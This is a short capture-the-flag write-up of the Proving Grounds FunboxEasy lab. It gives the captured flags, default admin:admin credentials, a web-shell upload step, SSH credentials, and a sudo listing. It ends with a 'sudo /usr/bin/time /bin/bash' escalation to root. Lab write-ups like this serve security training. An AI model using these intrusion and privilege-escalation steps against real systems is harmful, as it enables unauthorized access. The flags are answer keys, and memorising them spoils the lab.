# Proving Grounds FunboxEasy

> Saikat Karmakar | Mar 12:2021

```
ip = 192.168.77.111
```
-------------------------------------------------------------------------------

1. user flag
```
937c03c17e7d7670bbdd110de3676803
```
2. root flag
```
a45ece2835ae6839adc31924cfffbfb5
```



--
-----------
***Notes***
-----------
http://192.168.77.111/store/admin.php
login-> admin:admin

http://192.168.77.111/store/admin_book.php
uplaod the shell

ssh creds
```
tony : yxcvbnmYYY
```

```bash
tony@funbox3:~$ sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

```

```bash
sudo /usr/bin/time /bin/bash
```

